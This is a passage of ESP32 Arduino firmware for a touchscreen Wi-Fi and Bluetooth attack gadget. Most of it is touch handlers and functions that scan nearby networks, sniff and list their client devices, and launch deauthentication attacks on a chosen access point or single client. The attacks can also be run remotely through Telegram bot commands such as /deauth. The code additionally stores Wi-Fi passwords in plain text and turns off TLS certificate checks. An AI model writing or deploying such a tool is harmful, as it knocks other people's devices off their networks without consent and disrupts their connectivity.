    currentMode = MODE_PCAP_FILE_LIST;
    scanPCAPFiles();
    currentPcapFileIndex = 0;
    selectedPcapFileIndex = -1;
    tft.fillScreen(C_BG);
    displayPCAPFileList();
    drawPCAPFileListButtons();
  }
  else if (x >= NEXT_X && x < NEXT_X + BTN_W) {
    drawBtnPressed(NEXT_X, BTN_Y, BTN_W, "VIEW");
    delay(120);
    if(pcap.packetListIndex > 0) {
      enterPacketView();
    } else {
      showMessage("No packets yet", 1500);
    }
  }
  else if (x >= SEL_X && x < SEL_X + BTN_W) {
    drawBtnPressed(SEL_X, BTN_Y, BTN_W, pcap.filterByDevice ? "CLR" : 
            (pcap.filterByNetwork ? "CLEAR" : "TARGET"));
    delay(120);
    if(pcap.filterByDevice || pcap.filterByNetwork) {
      clearPCAPFilters();
      displayPCAPView();
      drawPCAPButtons();
    } else {
      currentMode = MODE_PCAP_SCAN_VIEW;
      tft.fillScreen(C_BG);
      displayPCAPScanView();
      drawPCAPScanButtons();
      pcapScanNetworks();
    }
  }
  else if (x >= DEAUTH_X && x < DEAUTH_X + BTN_W) {
    drawBtnPressed(DEAUTH_X, BTN_Y, BTN_W, pcap.isCapturing ? "STOP" : "START");
    delay(120);
    if (pcap.isCapturing) {
      stopPCAPCapture();
    } else {
      startPCAPCapture(0, 10000);
    }
    displayPCAPView();
    drawPCAPButtons();
  }
  else if (x >= STOP_X && x < STOP_X + BTN_W) {
    drawBtnPressed(STOP_X, BTN_Y, BTN_W, "CLEAR");
    delay(120);
    if(pcap.isCapturing) stopPCAPCapture();
    pcap.packetListIndex = 0;
    displayPCAPView();
    drawPCAPButtons();
    showMessage("Packet list cleared", 1000);
  }
  else if (x >= CONN_X && x < CONN_X + BTN_W) {
    drawBtnPressed(CONN_X, BTN_Y, BTN_W, "SCAN");
    delay(120);
    currentMode = MODE_PCAP_SCAN_VIEW;
    tft.fillScreen(C_BG);
    displayPCAPScanView();
    drawPCAPScanButtons();
    pcapScanNetworks();
  }
  else if (x >= CLIENT_X && x < CLIENT_X + BTN_W) {
    drawBtnPressed(CLIENT_X, BTN_Y, BTN_W, "DEVICE");
    delay(120);
    if(pcapSelectedNetworkIndex >= 0) {
      currentMode = MODE_PCAP_CLIENT_VIEW;
      tft.fillScreen(C_BG);
      pcapStartClientSniffer();
    } else {
      showMessage("Select network first!", 1500);
      currentMode = MODE_PCAP_SCAN_VIEW;
      tft.fillScreen(C_BG);
      displayPCAPScanView();
      drawPCAPScanButtons();
      pcapScanNetworks();
    }
  }
  else if (x >= SCAN_X && x < SCAN_X + BTN_W) {
    drawBtnPressed(SCAN_X, BTN_Y, BTN_W, "STATS");
    delay(120);
    if(!pcap.isCapturing) {
      if(initSDCard()) {
        uint64_t total = SD.totalBytes() / (1024 * 1024);
        uint64_t used = SD.usedBytes() / (1024 * 1024);
        char msg[64];
        sprintf(msg, "Free: %llu/%llu MB", total - used, total);
        showMessage(msg, 2000);
      }
    }
    displayPCAPView();
    drawPCAPButtons();
  }
}

void handleTetrisTouch(uint16_t x, uint16_t y) {
  if (y < BTN_Y || y > BTN_Y + BTN_H) return;
  
  int totalBtnWidth = BTN_W * 6 + BTN_GAP * 5;
  int startX = (SCREEN_W - totalBtnWidth) / 2;
  
  if (x >= startX && x < startX + BTN_W) {
    drawBtnPressed(startX, BTN_Y, BTN_W, "HOME");
    delay(120);
    currentMode = MODE_MAIN_MENU;
    tft.fillScreen(C_BG);
    drawMainMenu();
    drawMainMenuButtons();
    return;
  }
  
  if (x >= startX + (BTN_W + BTN_GAP) && x < startX + (BTN_W + BTN_GAP) + BTN_W) {
    drawBtnPressed(startX + (BTN_W + BTN_GAP), BTN_Y, BTN_W, "LEFT");
    if(tetrisGameActive && !tetrisGameOver) movePiece(-1, 0);
    drawTetris();
  }
  else if (x >= startX + (BTN_W + BTN_GAP) * 2 && x < startX + (BTN_W + BTN_GAP) * 2 + BTN_W) {
    drawBtnPressed(startX + (BTN_W + BTN_GAP) * 2, BTN_Y, BTN_W, "RIGHT");
    if(tetrisGameActive && !tetrisGameOver) movePiece(1, 0);
    drawTetris();
  }
  else if (x >= startX + (BTN_W + BTN_GAP) * 3 && x < startX + (BTN_W + BTN_GAP) * 3 + BTN_W) {
    drawBtnPressed(startX + (BTN_W + BTN_GAP) * 3, BTN_Y, BTN_W, "ROTATE");
    if(tetrisGameActive && !tetrisGameOver) rotatePiece();
    drawTetris();
  }
  else if (x >= startX + (BTN_W + BTN_GAP) * 4 && x < startX + (BTN_W + BTN_GAP) * 4 + BTN_W) {
    drawBtnPressed(startX + (BTN_W + BTN_GAP) * 4, BTN_Y, BTN_W, "DROP");
    if(tetrisGameActive && !tetrisGameOver) hardDrop();
    drawTetris();
  }
  else if (x >= startX + (BTN_W + BTN_GAP) * 5 && x < startX + (BTN_W + BTN_GAP) * 5 + BTN_W) {
    drawBtnPressed(startX + (BTN_W + BTN_GAP) * 5, BTN_Y, BTN_W, "STOP");
    currentMode = MODE_GAMES_MENU;
    tft.fillScreen(C_BG);
    drawGamesMenu();
    drawGamesMenuButtons();
  }
  
  delay(120);
}

void handleGalagaTouch(uint16_t x, uint16_t y) {
  if (y < BTN_Y || y > BTN_Y + BTN_H) return;
  
  int totalBtnWidth = BTN_W * 3 + BTN_GAP * 2;
  int startX = (SCREEN_W - totalBtnWidth) / 2;
  
  if (x >= startX && x < startX + BTN_W) {
    drawBtnPressed(startX, BTN_Y, BTN_W, "HOME");
    delay(120);
    currentMode = MODE_MAIN_MENU;
    tft.fillScreen(C_BG);
    drawMainMenu();
    drawMainMenuButtons();
  }
  else if (x >= startX + (BTN_W + BTN_GAP) && x < startX + (BTN_W + BTN_GAP) + BTN_W) {
    drawBtnPressed(startX + (BTN_W + BTN_GAP), BTN_Y, BTN_W, "START");
    showMessage("Galaga coming soon!", 1000);
  }
  else if (x >= startX + (BTN_W + BTN_GAP) * 2 && x < startX + (BTN_W + BTN_GAP) * 2 + BTN_W) {
    drawBtnPressed(startX + (BTN_W + BTN_GAP) * 2, BTN_Y, BTN_W, "STOP");
    currentMode = MODE_GAMES_MENU;
    tft.fillScreen(C_BG);
    drawGamesMenu();
    drawGamesMenuButtons();
  }
  
  delay(120);
}

void handleTouch(uint16_t x, uint16_t y) {
  if (y < BTN_Y || y > BTN_Y + BTN_H) return;
  
  if (x >= HOME_X && x < HOME_X + BTN_W) {
    drawBtnPressed(HOME_X, BTN_Y, BTN_W, "HOME");
    delay(120);
    if (deauthRunning) stopDeauth();
    if (snifferRunning) stopSniffer();
    if (pcap.isCapturing) stopPCAPCapture();
    currentMode = MODE_MAIN_MENU;
    tft.fillScreen(C_BG);
    drawMainMenu();
    drawMainMenuButtons();
    return;
  }
  
  if      (x>=PREV_X   && x<PREV_X+BTN_W)   { drawBtnPressed(PREV_X,BTN_Y,BTN_W,"PREV");    prevNetwork(); drawButtons(); }
  else if (x>=NEXT_X   && x<NEXT_X+BTN_W)   { drawBtnPressed(NEXT_X,BTN_Y,BTN_W,"NEXT");    nextNetwork(); drawButtons(); }
  else if (x>=SEL_X    && x<SEL_X+BTN_W)    { drawBtnPressed(SEL_X,BTN_Y,BTN_W,"SEL");      selectCurrentNetwork(); }
  else if (x>=DEAUTH_X && x<DEAUTH_X+BTN_W) { drawBtnPressed(DEAUTH_X,BTN_Y,BTN_W,"DEAUTH"); startDeauth(); }
  else if (x>=STOP_X   && x<STOP_X+BTN_W)   { drawBtnPressed(STOP_X,BTN_Y,BTN_W,"STOP");    stopDeauth(); }
  else if (x>=CONN_X   && x<CONN_X+BTN_W)   { drawBtnPressed(CONN_X,BTN_Y,BTN_W,"CONN");    connectToSelectedNetwork(); }
  else if (x>=CLIENT_X && x<CLIENT_X+BTN_W) { drawBtnPressed(CLIENT_X,BTN_Y,BTN_W,"CLIENT"); enterClientView(); }
  else if (x>=SCAN_X   && x<SCAN_X+BTN_W)   { drawBtnPressed(SCAN_X,BTN_Y,BTN_W,"SCAN");    scanNetworks(); }
  delay(120);
}

void handleClientTouch(uint16_t x, uint16_t y) {
  if (y < BTN_Y || y > BTN_Y + BTN_H) return;
  int clientCount;
  portENTER_CRITICAL(&snifferMux); clientCount = totalClients; portEXIT_CRITICAL(&snifferMux);

  if (x >= HOME_X && x < HOME_X + BTN_W) {
    drawBtnPressed(HOME_X, BTN_Y, BTN_W, "HOME");
    delay(120);
    if (deauthRunning) stopDeauth();
    if (snifferRunning) stopSniffer();
    currentMode = MODE_MAIN_MENU;
    tft.fillScreen(C_BG);
    drawMainMenu();
    drawMainMenuButtons();
    return;
  }

  if (x>=PREV_X && x<PREV_X+BTN_W) {
    drawBtnPressed(PREV_X,BTN_Y,BTN_W,"PREV");
    if (clientCount>0) { clientViewIndex--; if (clientViewIndex<0) clientViewIndex=clientCount-1; }
    displayClientView(); drawClientButtons();
  }
  else if (x>=NEXT_X && x<NEXT_X+BTN_W) {
    drawBtnPressed(NEXT_X,BTN_Y,BTN_W,"NEXT");
    if (clientCount>0) { clientViewIndex++; if (clientViewIndex>=clientCount) clientViewIndex=0; }
    displayClientView(); drawClientButtons();
  }
  else if (x>=SEL_X && x<SEL_X+BTN_W) {
    drawBtnPressed(SEL_X,BTN_Y,BTN_W,"SEL");
    portENTER_CRITICAL(&snifferMux);
    if (clientCount>0) {
      if (selectedClientIdx==clientViewIndex) {
        selectedClientIdx=-1; clients[clientViewIndex].targeted=false;
      } else {
        if (selectedClientIdx>=0) clients[selectedClientIdx].targeted=false;
        selectedClientIdx=clientViewIndex; clients[clientViewIndex].targeted=true;
      }
    }
    portEXIT_CRITICAL(&snifferMux);
    displayClientView(); drawClientButtons();
  }
  else if (x>=DEAUTH_X && x<DEAUTH_X+BTN_W) {
    drawBtnPressed(DEAUTH_X,BTN_Y,BTN_W,"DEAUTH");
    int ti = (selectedClientIdx>=0) ? selectedClientIdx : clientViewIndex;
    if (ti>=0 && ti<clientCount) startClientDeauth(ti);
    else showMessage("No client!");
  }
  else if (x>=STOP_X && x<STOP_X+BTN_W) {
    drawBtnPressed(STOP_X,BTN_Y,BTN_W,"STOP");
    stopDeauth();
  }
  else if (x>=CONN_X && x<CONN_X+BTN_W) {
    drawBtnPressed(CONN_X,BTN_Y,BTN_W,"BACK");
    if (deauthRunning) stopDeauth(); else exitClientView();
  }
  else if (x>=CLIENT_X && x<CLIENT_X+BTN_W) {
    drawBtnPressed(CLIENT_X,BTN_Y,BTN_W,"CLEAR");
    portENTER_CRITICAL(&snifferMux); totalClients=0; portEXIT_CRITICAL(&snifferMux);
    clientViewIndex=0; selectedClientIdx=-1;
    if (!snifferRunning && selectedNetworkIndex>=0)
      startSniffer(networks[selectedNetworkIndex].channel, networks[selectedNetworkIndex].bssid, networks[selectedNetworkIndex].ssid);
    displayClientView(); drawClientButtons();
  }
  else if (x>=SCAN_X && x<SCAN_X+BTN_W) {
    drawBtnPressed(SCAN_X,BTN_Y,BTN_W,"AP ATK");
    startDeauth();
  }
  delay(120);
}

void handleBTTouch(uint16_t x, uint16_t y) {
  if (y < BTN_Y || y > BTN_Y + BTN_H) return;
  
  if (x >= HOME_X && x < HOME_X + BTN_W) {
    drawBtnPressed(HOME_X, BTN_Y, BTN_W, "HOME");
    delay(120);
    if (btScanning) stopBTScan();
    if (btDeauthRunning) stopBTDeauth();
    currentMode = MODE_MAIN_MENU;
    tft.fillScreen(C_BG);
    drawMainMenu();
    drawMainMenuButtons();
    return;
  }
  
  if (x >= PREV_X && x < PREV_X + BTN_W) {
    drawBtnPressed(PREV_X, BTN_Y, BTN_W, "PREV");
    delay(120);
    prevBTDevice();
    drawBTButtons();
  }
  else if (x >= NEXT_X && x < NEXT_X + BTN_W) {
    drawBtnPressed(NEXT_X, BTN_Y, BTN_W, "NEXT");
    delay(120);
    nextBTDevice();
    drawBTButtons();
  }
  else if (x >= SEL_X && x < SEL_X + BTN_W) {
    drawBtnPressed(SEL_X, BTN_Y, BTN_W, "SEL");
    delay(120);
    selectBTDevice();
    drawBTButtons();
  }
  else if (x >= DEAUTH_X && x < DEAUTH_X + BTN_W) {
    drawBtnPressed(DEAUTH_X, BTN_Y, BTN_W, "DEAUTH");
    delay(120);
    if (btDeauthRunning) {
      stopBTDeauth();
    } else {
      startBTDeauth();
    }
    drawBTButtons();
  }
  else if (x >= STOP_X && x < STOP_X + BTN_W) {
    drawBtnPressed(STOP_X, BTN_Y, BTN_W, "STOP");
    delay(120);
    stopBTDeauth();
    drawBTButtons();
  }
  else if (x >= SCAN_X && x < SCAN_X + BTN_W) {
    drawBtnPressed(SCAN_X, BTN_Y, BTN_W, "SCAN");
    delay(120);
    if (btScanning) {
      stopBTScan();
    } else {
      startBTScan();
    }
    displayBTScanner();
    drawBTButtons();
  }
}

// ============================================================
//  NETWORK FUNCTIONS (WiFi)
// ============================================================
void prevNetwork() {
  if (!totalNetworks) return;
  currentIndex--; if (currentIndex<0) currentIndex=totalNetworks-1;
  drawListPanel();
}

void nextNetwork() {
  if (!totalNetworks) return;
  currentIndex++; if (currentIndex>=totalNetworks) currentIndex=0;
  drawListPanel();
}

void selectCurrentNetwork() {
  if (!totalNetworks) { showMessage("Scan first!"); return; }
  if (selectedNetworkIndex == currentIndex) {
    selectedNetworkIndex = -1; 
    showMessage("Target deselected - Isolation OFF");
    Serial.println("[+] Network isolation deactivated");
  } else {
    selectedNetworkIndex = currentIndex;
    attackChannel = networks[currentIndex].channel;
    
    String msg = "NETWORK ISOLATION ACTIVE\nTarget: " + networks[currentIndex].ssid + 
                 "\nCH: " + String(networks[currentIndex].channel) +
                 "\nOnly devices from this\nnetwork will be visible";
    showMessage(msg, 2500);
    
    Serial.printf("[+] NETWORK ISOLATION ENABLED\n");
    Serial.printf("    Selected Network: %s (CH:%d)\n", 
      networks[currentIndex].ssid.c_str(),
      networks[currentIndex].channel);
  }
  drawListPanel(); drawButtons();
}

void scanNetworks() {
  if (!isWiFiRadioAvailable()) {
    Serial.println("[WiFi] Radio not active, switching...");
    requestRadioModeSwitch(RADIO_MODE_WIFI);
    handleRadioModeSwitch();
    delay(500);
  }

  if (btScanning) stopBTScan();
  if (btDeauthRunning) stopBTDeauth();
  if (pcap.isCapturing) stopPCAPCapture();
  
  if (deauthRunning) { showMessage("Stop deauth first!"); return; }
  if (snifferRunning) stopSniffer();
  
  showMessage("Scanning...", 200);
  
  Serial.println("[*] Starting WiFi scan...");
  
  WiFi.disconnect(true, true);
  delay(100);
  
  WiFi.mode(WIFI_OFF);
  delay(100);
  
  WiFi.mode(WIFI_STA);
  delay(100);
  
  WiFi.setSleep(false);
  esp_wifi_set_ps(WIFI_PS_NONE);
  
  WiFi.scanDelete();
  
  silenceLogs();
  
  int found = WiFi.scanNetworks(false, true);
  
  Serial.printf("[*] Scan complete, found %d networks\n", found);
  
  if (found <= 0) {
    if (found == 0) {
      showMessage("No Networks Found!", 1500);
      Serial.println("[!] No networks found");
    } else {
      showMessage("Scan Failed!", 1500);
      Serial.printf("[!] Scan error: %d\n", found);
    }
    totalNetworks = 0;
    drawListPanel();
    drawButtons();
    drawRadarPanelFrame();
    return;
  }
  
  totalNetworks = min(found, MAX_NETWORKS);
  selectedNetworkIndex = -1;
  currentIndex = 0;
  
  for (int i = 0; i < totalNetworks; i++) {
    networks[i].ssid = WiFi.SSID(i);
    if (networks[i].ssid.length() == 0) networks[i].ssid = "<Hidden>";
    networks[i].rssi = WiFi.RSSI(i);
    networks[i].channel = WiFi.channel(i);
    networks[i].encryptionType = WiFi.encryptionType(i);
    networks[i].targeted = false;
    
    uint8_t mac[6];
    if (WiFi.BSSID(i, mac)) {
      memcpy(networks[i].bssid, mac, 6);
      char ms[18];
      sprintf(ms, "%02X:%02X:%02X:%02X:%02X:%02X", 
        mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
      networks[i].bssidStr = String(ms);
    }
    
    Serial.printf("  %2d. %-24s CH%2d %4ddBm %s\n", 
      i+1, 
      networks[i].ssid.c_str(), 
      networks[i].channel, 
      networks[i].rssi, 
      encStr(networks[i].encryptionType).c_str());
  }
  
  WiFi.scanDelete();
  
  assignRadarPositions();
  clientViewActive = false;
  drawListPanel();
  drawRadarPanelFrame();
  drawButtons();
  
  showMessage(String(totalNetworks) + " Networks Found", 1000);
  Serial.printf("[+] Scan complete: %d networks found\n", totalNetworks);
}

// ============================================================
//  ATTACK (WiFi)
// ============================================================
void startDeauth() {
  if (!isWiFiRadioAvailable()) {
    Serial.println("[WiFi] Radio not active for deauth, switching...");
    requestRadioModeSwitch(RADIO_MODE_WIFI);
    handleRadioModeSwitch();
    delay(500);
  }
  if (btScanning) stopBTScan();
  if (btDeauthRunning) stopBTDeauth();
  if (pcap.isCapturing) stopPCAPCapture();
  
  if (selectedNetworkIndex<0) { showMessage("SELECT target first!"); return; }

  totalPackets=0; actualRate=0; peakRate=0; packetsThisSecond=0;
  attackStartTime=millis(); seqNum=random(0,65535);
  attackChannel = networks[selectedNetworkIndex].channel;
  showMessage("Starting deauth...", 500);
  if (!resetWiFiForDeauth()) { showMessage("WiFi init failed!"); return; }
  if (!buildDeauthPackets(networks[selectedNetworkIndex].bssid, NULL)) { showMessage("Packet build failed!"); return; }
  deauthRunning=true; clientDeauthRunning=false;
  Serial.printf("[+] AP Deauth attack started on: %s CH:%d\n", 
    networks[selectedNetworkIndex].ssid.c_str(), attackChannel);
  drawListPanel(); drawButtons();
}

void startClientDeauth(int idx) {
  if (idx<0||idx>=totalClients) return;
  if (selectedNetworkIndex<0) { showMessage("No AP selected!"); return; }
  totalPackets=0; actualRate=0; peakRate=0; packetsThisSecond=0;
  attackStartTime=millis(); seqNum=random(0,65535);
  attackChannel = networks[selectedNetworkIndex].channel;
  showMessage("Targeting client...", 500);
  stopSniffer();
  if (!resetWiFiForDeauth()) { showMessage("WiFi init failed!"); return; }
  portENTER_CRITICAL(&snifferMux);
  uint8_t* cm = clients[idx].mac;
  portEXIT_CRITICAL(&snifferMux);
  if (!buildDeauthPackets(networks[selectedNetworkIndex].bssid, cm)) { showMessage("Packet build failed!"); return; }
  deauthRunning=true; clientDeauthRunning=true; selectedClientIdx=idx;
  Serial.printf("[+] Client deauth attack started on: %s\n", clients[idx].macStr.c_str());
  drawClientButtons(); displayClientView();
}

void stopDeauth() {
  if (!deauthRunning) { showMessage("Not running"); return; }
  deauthRunning=false; clientDeauthRunning=false; pktsBuilt=false;
  Serial.printf("[+] Attack stopped. Total packets: %lu\n", totalPackets);
  restoreWiFi();
  if (clientViewActive) {
    if (selectedNetworkIndex>=0)
      startSniffer(networks[selectedNetworkIndex].channel, networks[selectedNetworkIndex].bssid, networks[selectedNetworkIndex].ssid);
    displayClientView(); drawClientButtons();
  } else {
    drawListPanel(); drawButtons();
  }
  drawRadarPanelFrame();
}

// ============================================================
//  CLIENT VIEW ENTER/EXIT
// ============================================================
void enterClientView() {
  if (selectedNetworkIndex<0) { showMessage("Select AP first!"); return; }
  clientViewActive=true; clientViewIndex=0; selectedClientIdx=-1;
  showMessage("Starting sniffer...", 300);
  if (!startSniffer(networks[selectedNetworkIndex].channel, networks[selectedNetworkIndex].bssid, networks[selectedNetworkIndex].ssid)) {
    showMessage("Sniffer failed!", 2000);
    clientViewActive=false; return;
  }
  showIsolationMessage(networks[selectedNetworkIndex].ssid);
  displayClientView(); drawClientButtons();
}

void exitClientView() {
  stopSniffer(); clientViewActive=false; clientDeauthRunning=false;
  deauthRunning=false; pktsBuilt=false;
  WiFi.mode(WIFI_STA); delay(100); silenceLogs();
  if (storedNetworkCount>0)
    connectToWiFiNetwork(storedNetworks[0].ssid, storedNetworks[0].password);
  drawListPanel(); drawButtons(); drawRadarPanelFrame();
}

// ============================================================
//  WIFI CONNECTION FUNCTIONS
// ============================================================
void connectToSelectedNetwork() {
  if (deauthRunning) { showMessage("Stop deauth first!"); return; }
  if (!totalNetworks) { showMessage("Scan first!"); return; }
  NetworkInfo &n = networks[currentIndex];
  if (n.encryptionType == WIFI_AUTH_OPEN) {
    connectToWiFiNetwork(n.ssid, "");
  } else {
    showMessage("Enter password in Serial", 2000);
    Serial.println("[?] Password for: " + n.ssid);
    awaitingPassword=true; pendingSSID=n.ssid; serialPromptTime=millis();
  }
}

void connectToWiFiNetwork(String ssid, String password) {
  if (isConnecting) return;
  isConnecting=true; connectionStartTime=millis();
  Serial.println("[+] Connecting to: " + ssid);
  showMessage("Connecting...", 500);
  WiFi.disconnect(true,true); delay(100);
  WiFi.mode(WIFI_STA); silenceLogs();
  WiFi.begin(ssid.c_str(), password.c_str());
  int attempts=0;
  while (WiFi.status()!=WL_CONNECTED && attempts<30) { delay(500); attempts++; }
  isConnecting=false;
  if (WiFi.status()==WL_CONNECTED) {
    isConnectedToNetwork=true;
    String ip = WiFi.localIP().toString();
    Serial.println("[+] Connected! IP: " + ip);
    showMessage("IP: " + ip, 2000);
    if (password.length()>0) addStoredNetwork(ssid, password);
    if (config.botToken.length()>0 && config.chatId.length()>0) {
      config.telegramEnabled=true;
      sendTG("ESP32 online\nIP: " + ip, config.chatId);
    }
    setupWebServer();
  } else {
    isConnectedToNetwork=false;
    showMessage("Connection failed!", 1500);
  }
  drawListPanel(); drawButtons(); drawRadarPanelFrame();
}

void disconnectFromWiFi() {
  if (deauthRunning) { showMessage("Stop deauth first!"); return; }
  WiFi.disconnect(true,true); isConnectedToNetwork=false; config.telegramEnabled=false;
  showMessage("Disconnected", 1500);
  drawListPanel(); drawButtons(); drawRadarPanelFrame();
}

void addStoredNetwork(String ssid, String password) {
  for (int i=0; i<storedNetworkCount; i++) {
    if (storedNetworks[i].ssid==ssid) { storedNetworks[i].password=password; saveConfig(); return; }
  }
  if (storedNetworkCount<MAX_STORED_NETWORKS) {
    storedNetworks[storedNetworkCount].ssid=ssid;
    storedNetworks[storedNetworkCount].password=password;
    storedNetworkCount++; saveConfig();
  }
}

// ============================================================
//  TELEGRAM FUNCTIONS
// ============================================================
void checkTelegram() {
  if (!isConnectedToNetwork || config.botToken.length()==0) return;
  WiFiClientSecure client; client.setInsecure();
  HTTPClient http;
  String url = "https://"+String(TELEGRAM_API)+"/bot"+config.botToken+
               "/getUpdates?offset="+String(lastUpdateId+1)+"&timeout=2";
  http.begin(client, url); http.setTimeout(4000);
  int code = http.GET();
  if (code==200) {
    String payload = http.getString();
    JsonDocument doc;
    if (!deserializeJson(doc, payload)) {
      for (JsonObject r : doc["result"].as<JsonArray>()) {
        lastUpdateId = r["update_id"].as<long>();
        String cid = r["message"]["chat"]["id"].as<String>();
        String txt = r["message"]["text"].as<String>();
        if (txt.length()>0 && cid==config.chatId) handleTGCommand(txt, cid);
      }
    }
  }
  http.end();
}

void handleTGCommand(String cmd, String chatId) {
  String lc=cmd; lc.toLowerCase(); lc.trim();
  if (lc=="/help"||lc=="/start")
    sendTG("*Commands:*\n/scan /list /select [n] /deauth /stop /stats /status /clients", chatId);
  else if (lc=="/scan")   { sendTG("Scanning...", chatId); scanNetworks(); }
  else if (lc=="/deauth") { startDeauth(); sendTG("Attack started", chatId); }
  else if (lc=="/stop")   { stopDeauth();  sendTG("Stopped", chatId); }
  else if (lc=="/stats")  sendStatsTG(chatId);
  else if (lc=="/status") {
    int cc; portENTER_CRITICAL(&snifferMux); cc=totalClients; portEXIT_CRITICAL(&snifferMux);
    String s = "*Status*\nAttack: "+(deauthRunning?String("RUNNING"):String("Off"))+
               "\nIsolation: "+(snifferRunning?String("ACTIVE"):String("Off"))+
               "\nTarget: "+(selectedNetworkIndex>=0?networks[selectedNetworkIndex].ssid:String("None"))+
               "\nClients: "+String(cc)+"\nPackets: "+String(totalPackets)+"\nRate: "+String(actualRate)+"/s";
    sendTG(s, chatId);
  }
  else if (lc=="/list") {
    if (totalNetworks==0) { sendTG("No networks.", chatId); return; }
    String s="*Networks:*\n";
    for (int i=0; i<min(totalNetworks,10); i++)
      s+=String(i+1)+". "+networks[i].ssid+" CH"+networks[i].channel+" "+networks[i].rssi+"dBm\n";
    sendTG(s, chatId);
  }
  else if (lc.startsWith("/select")) {
    int n=lc.substring(7).toInt();
    if (n>0&&n<=totalNetworks) { currentIndex=n-1; selectCurrentNetwork(); sendTG("Selected: "+networks[currentIndex].ssid, chatId); }
    else sendTG("Invalid network number", chatId);
  }
  else if (lc=="/clients") {
    int cc; portENTER_CRITICAL(&snifferMux); cc=totalClients; portEXIT_CRITICAL(&snifferMux);
    if (cc==0) { sendTG("No clients.", chatId); return; }
    String s="*Clients on "+networks[selectedNetworkIndex].ssid+"* (Isolated Network)\n";
    portENTER_CRITICAL(&snifferMux);
    for (int i=0; i<cc; i++)
      s+=String(i+1)+". "+clients[i].macStr+" | "+String(clients[i].rssi)+"dBm | "+String(clients[i].pktCount)+"pkts\n";
    portEXIT_CRITICAL(&snifferMux);
    sendTG(s, chatId);
  }
}

bool sendTG(String msg, String chatId) {
  if (!isConnectedToNetwork || config.botToken.length()==0 || chatId.length()==0) return false;
  WiFiClientSecure client; client.setInsecure();
  HTTPClient http;
  http.begin(client, "https://"+String(TELEGRAM_API)+"/bot"+config.botToken+"/sendMessage");
  http.addHeader("Content-Type","application/json"); http.setTimeout(4000);
  JsonDocument doc; doc["chat_id"]=chatId; doc["text"]=msg; doc["parse_mode"]="Markdown";
  String body; serializeJson(doc, body);
  int code = http.POST(body); http.end(); return code==200;
}

void sendStatsTG(String chatId) {
  String s = "*Stats*\nPackets: "+String(totalPackets)+"\nRate: "+String(actualRate)+"/s\nPeak: "+String(peakRate)+"/s";
  if (deauthRunning) { unsigned long rt=(millis()-attackStartTime)/1000; s+="\nTime: "+String(rt/60)+"m"+String(rt%60)+"s"; }
  if (selectedNetworkIndex>=0) s+="\nTarget: "+networks[selectedNetworkIndex].ssid;
  if (snifferRunning) s+="\nIsolation: ACTIVE";
  sendTG(s, chatId);
}

// ============================================================
//  CONFIG FUNCTIONS
// ============================================================
bool loadConfig() {
  preferences.begin("deauth-tool", false);
  config.botToken        = preferences.getString("botToken", "");
  config.chatId          = preferences.getString("chatId", "");
  config.telegramEnabled = preferences.getBool("tgEnabled", false);
  storedNetworkCount = preferences.getInt("netCount", 0);
  for (int i=0; i<storedNetworkCount&&i<MAX_STORED_NETWORKS; i++) {
    storedNetworks[i].ssid     = preferences.getString(("netSSID"+String(i)).c_str(), "");
    storedNetworks[i].password = preferences.getString(("netPass"+String(i)).c_str(), "");
  }
  touchCal.xMin  = preferences.getInt("txMin",  0);
  touchCal.xMax  = preferences.getInt("txMax",  480);
  touchCal.yMin  = preferences.getInt("tyMin",  0);
  touchCal.yMax  = preferences.getInt("tyMax",  320);
  touchCal.flipX = preferences.getBool("tflipX",  true);
  touchCal.flipY = preferences.getBool("tflipY",  true);
  touchCal.swapXY= preferences.getBool("tswapXY", false);
  preferences.end(); return true;
}

void saveConfig() {
  preferences.begin("deauth-tool", false);
  preferences.putString("botToken", config.botToken);
  preferences.putString("chatId",   config.chatId);
  preferences.putBool("tgEnabled",  config.telegramEnabled);
  preferences.putInt("netCount", storedNetworkCount);
  for (int i=0; i<storedNetworkCount&&i<MAX_STORED_NETWORKS; i++) {
    preferences.putString(("netSSID"+String(i)).c_str(), storedNetworks[i].ssid);
    preferences.putString(("netPass"+String(i)).c_str(), storedNetworks[i].password);
  }
  preferences.putInt("txMin",  touchCal.xMin);
  preferences.putInt("txMax",  touchCal.xMax);
  preferences.putInt("tyMin",  touchCal.yMin);
  preferences.putInt("tyMax",  touchCal.yMax);
  preferences.putBool("tflipX",  touchCal.flipX);
  preferences.putBool("tflipY",  touchCal.flipY);
  preferences.putBool("tswapXY", touchCal.swapXY);
  preferences.end();
}

void calibrateTouch() {
  showMessage("Touch TOP-LEFT corner", 0);
  unsigned long st = millis();
  while (millis()-st<10000) {
    ts.read();
    if (ts.isTouched) { touchCal.xMin=ts.points[0].x; touchCal.yMin=ts.points[0].y; delay(500); break; }
    delay(10);
  }
  showMessage("Touch BOTTOM-RIGHT corner", 0);
  st = millis();
  while (millis()-st<10000) {
    ts.read();
    if (ts.isTouched) { touchCal.xMax=ts.points[0].x; touchCal.yMax=ts.points[0].y; delay(500); break; }
    delay(10);
  }
  saveConfig(); showMessage("Calibration saved", 1500);
}

// ============================================================
//  SERIAL COMMANDS
// ============================================================
void printHelp() {
  Serial.println(F("\n=== RADIO CONTROL ==="));
  Serial.println(F("radio wifi   - Switch to WiFi mode"));
  Serial.println(F("radio bt     - Switch to Bluetooth mode"));
  Serial.println(F("radio none   - Turn off all radios"));
  Serial.println(F("radio status - Show radio status"));
  Serial.println(F("\n=== COMMANDS ==="));
  Serial.println(F("scan / list / select [n] / connect [n or ssid pass]"));
  Serial.println(F("disconnect / deauth / stop / status / stats"));
  Serial.println(F("clients / stored / calibrate / reboot / help"));
  Serial.println(F("bt / btstop / btlist / btselect / btdeauth / btstopdeauth"));
  Serial.println(F("\n=== GAMES ==="));
  Serial.println(F("games / tetris / galaga"));
  Serial.println(F("\n=== PCAP CAPTURE ==="));
  Serial.println(F("pcap_start / pcap_stop / pcap_list / pcap_view [filename] / pcap_delete [filename]"));
  Serial.println(F("pcap_target [network number] / pcap_device [client number] / pcap_clear"));
  Serial.println(F("pcap_scan / pcap_networks / pcap_select_network [n] / pcap_sniff / pcap_clients"));
  Serial.println(F("\n=== ISOLATION FEATURES ==="));
  Serial.println(F("Select a network to enable isolation"));
  Serial.println(F("CLIENT button shows ONLY devices from selected network"));
  Serial.println(F("HOME button returns to main menu"));
}

void processSerialCommand(String cmd) {
  cmd.trim();

  if (cmd == "radio wifi") {
    requestRadioModeSwitch(RADIO_MODE_WIFI);
    handleRadioModeSwitch();
    Serial.println("[CMD] Switching to WiFi mode...");
    return;
  }
  else if (cmd == "radio bt") {
    requestRadioModeSwitch(RADIO_MODE_BT);
    handleRadioModeSwitch();
